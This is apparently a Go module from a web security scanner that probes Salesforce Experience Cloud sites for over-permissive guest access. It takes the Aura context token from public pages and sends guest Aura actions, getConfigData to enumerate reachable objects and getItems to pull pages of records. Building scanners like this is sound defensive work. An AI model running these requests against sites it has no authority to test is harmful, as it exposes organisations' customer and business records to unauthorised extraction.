package salesforce

import (
	"encoding/json"
	"fmt"
	"net/url"
	"regexp"
	"strings"

	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/infra/saasprobe"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
)

// Verbatim Aura action descriptors (from the Experience Cloud guest-exposure
// research). Only the message payload changes between techniques; the transport
// (aura.context harvested from the site, aura.token=null for a guest) is shared.
const (
	descGetConfigData = "serviceComponent://ui.force.components.controllers.hostConfig.HostConfigController/ACTION$getConfigData"
	descGetItems      = "serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems"
)

// contextTokenRe extracts the serialized aura.context embedded in a
// /s/sfsites/l/<CONTEXT>/<hash>.js asset URL the site emits for its own JS. The
// captured token is used verbatim as the aura.context form field (it is already
// URL-safe on the wire).
var contextTokenRe = regexp.MustCompile(`/s/sfsites/l/([a-zA-Z0-9\-_~.%]+)/[^/]+\.js`)

// contextHarvestPaths are pages likely to embed the aura.context asset URL.
var contextHarvestPaths = []string{"/s/", "/", "/s/global-search/%40sfdc%40"}

// harvestLandingPages fetches each community landing page in contextHarvestPaths
// (following redirects, cache-bypassed) and applies extract to the first body it
// retrieves, returning on the first successful extraction. It is the shared
// fetch-and-scan loop behind HarvestAuraContext and HarvestAuraMode.
func harvestLandingPages(ctx *httpmsg.HttpRequestResponse, client *http.Requester, extract func(body string) (string, bool)) (string, bool) {
	for _, p := range contextHarvestPaths {
		res := saasprobe.GetFollow(ctx, client, p, nil)
		if !res.OK {
			continue
		}
		if v, ok := extract(res.Body); ok {
			return v, true
		}
	}
	return "", false
}

// HarvestAuraContext fetches a community landing page and extracts the
// aura.context token needed to invoke Aura actions. Returns ("", false) when no
// context can be found (the modules then skip the host — a stale/absent context
// only produces framework errors, never data).
func HarvestAuraContext(ctx *httpmsg.HttpRequestResponse, client *http.Requester) (string, bool) {
	return harvestLandingPages(ctx, client, func(body string) (string, bool) {
		if m := contextTokenRe.FindStringSubmatch(body); m != nil {
			return m[1], true
		}
		return "", false
	})
}

// PrepareGateway locates a live Aura gateway and marks the tech registry on
// presence — a live gateway is definitive Salesforce, independent of any finding.
// It is the shared presence gate for modules that need only gateway presence, not
// the aura.context. ok=false when no gateway responds (a non-Salesforce host).
func PrepareGateway(ctx *httpmsg.HttpRequestResponse, client *http.Requester, sc *modkit.ScanContext) (endpoint string, ok bool) {
	endpoint, ok = FindLiveAuraGateway(ctx, client)
	if !ok {
		return "", false
	}
	MarkSalesforce(sc, hostOf(ctx))
	return endpoint, true
}

// Prepare finds a live Aura gateway and harvests the aura.context both data
// modules need before invoking any action. It layers the context harvest on the
// shared PrepareGateway presence gate: ok=false when either is missing (a
// non-Salesforce host has no gateway), so a module skips the host cleanly.
func Prepare(ctx *httpmsg.HttpRequestResponse, client *http.Requester, sc *modkit.ScanContext) (endpoint, auraContext string, ok bool) {
	endpoint, ok = PrepareGateway(ctx, client, sc)
	if !ok {
		return "", "", false
	}
	auraContext, ok = HarvestAuraContext(ctx, client)
	if !ok {
		return "", "", false
	}
	return endpoint, auraContext, true
}

// IsCustomObject reports whether an SObject API name is a custom (__c) object —
// the crisp signal of over-permissive guest access. Shared by both active modules
// so the classification rule lives in one place.
func IsCustomObject(name string) bool {
	return strings.HasSuffix(name, "__c")
}

// BuildGetConfigData returns the verbatim getConfigData message payload, which
// enumerates the SObjects the guest user can reach (apiNamesToKeyPrefixes).
func BuildGetConfigData() string {
	return `{"actions":[{"id":"123;a","descriptor":"` + descGetConfigData + `","callingDescriptor":"UNKNOWN","params":{}}]}`
}

// BuildGetItems returns a getItems message payload for one object, pulling a page
// of records (the record-extraction technique).
func BuildGetItems(entity string, pageSize, currentPage int) string {
	// entity is a Salesforce API name (identifier + optional __c); marshal it so a
	// crafted name can never break out of the JSON string.
	enc, _ := json.Marshal(entity)
	return fmt.Sprintf(
		`{"actions":[{"id":"123;a","descriptor":"%s","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":%s,"layoutType":"FULL","pageSize":%d,"currentPage":%d,"useTimeout":false,"getCount":true,"enableRowActions":false}}]}`,
		descGetItems, string(enc), pageSize, currentPage,
	)
}

// InvokeAction POSTs an Aura action to the gateway with the harvested context and
// a null (guest) token. Only the message field varies between calls.
func InvokeAction(ctx *httpmsg.HttpRequestResponse, client *http.Requester, endpoint, message, auraContext string) saasprobe.Result {
	// aura.context is passed verbatim (already URL-safe as extracted from the asset
	// URL); message is form-encoded.
	body := "message=" + url.QueryEscape(message) + "&aura.context=" + auraContext + "&aura.token=null"
	return saasprobe.Post(ctx, client, endpoint, body, map[string]string{
		"Content-Type":         "application/x-www-form-urlencoded",
		"X-SFDC-LDS-Endpoints": "ApexActionController.execute",
	})
}

// AuraResponse is the decoded Aura action-batch envelope.
type AuraResponse struct {
	Actions []struct {
		ID          string          `json:"id"`
		State       string          `json:"state"`
		ReturnValue json.RawMessage `json:"returnValue"`
	} `json:"actions"`
}

// antiJSONPrefixes are the guard prefixes Aura may prepend to a JSON body. Any
// trailing newline is handled by the TrimSpace in ParseAuraResponse, so only the
// bare prefixes are listed.
var antiJSONPrefixes = []string{"while(1);", "for(;;);", ")]}'"}

// ParseAuraResponse decodes an Aura response body, stripping any anti-JSON guard
// prefix. ok is false when the body is not a JSON object (e.g. an HTML error).
func ParseAuraResponse(body string) (AuraResponse, bool) {
	trimmed := strings.TrimSpace(body)
	for _, p := range antiJSONPrefixes {
		if strings.HasPrefix(trimmed, p) {
			trimmed = strings.TrimSpace(strings.TrimPrefix(trimmed, p))
		}
	}
	if trimmed == "" || trimmed[0] != '{' {
		return AuraResponse{}, false
	}
	var r AuraResponse
	if err := json.Unmarshal([]byte(trimmed), &r); err != nil {
		return AuraResponse{}, false
	}
	return r, true
}

// SuccessReturnValue returns the returnValue of the first action whose state is
// SUCCESS, or (nil,false) when no action succeeded (ERROR / exceptionEvent /
// invalidSession). This is the confirmation oracle: only a SUCCESS action with a
// populated returnValue evidences guest Aura execution.
func (r AuraResponse) SuccessReturnValue() (json.RawMessage, bool) {
	for _, a := range r.Actions {
		if strings.EqualFold(a.State, "SUCCESS") && len(a.ReturnValue) > 0 {
			return a.ReturnValue, true
		}
	}
	return nil, false
}

// AccessibleObjects extracts the apiNamesToKeyPrefixes map (object API name → key
// prefix) from a getConfigData returnValue. Empty when absent.
func AccessibleObjects(returnValue json.RawMessage) map[string]string {
	var c struct {
		APINamesToKeyPrefixes map[string]string `json:"apiNamesToKeyPrefixes"`
	}
	if err := json.Unmarshal(returnValue, &c); err != nil {
		return nil
	}
	return c.APINamesToKeyPrefixes
}

// RecordCount inspects a getItems returnValue and returns the number of records
// on the page plus the total count when present. ok is false when the shape is
// not a record result at all (so a non-record SUCCESS envelope can't be mistaken
// for data).
func RecordCount(returnValue json.RawMessage) (page int, total *int, ok bool) {
	// Common shape: {"result":[...],"totalCount":N,...}
	var obj struct {
		Result     []json.RawMessage `json:"result"`
		TotalCount *int              `json:"totalCount"`
	}
	if err := json.Unmarshal(returnValue, &obj); err == nil && obj.Result != nil {
		return len(obj.Result), obj.TotalCount, true
	}
	// Fallback shape: a bare array of records.
	var arr []json.RawMessage
	if err := json.Unmarshal(returnValue, &arr); err == nil {
		return len(arr), nil, true
	}
	return 0, nil, false
}
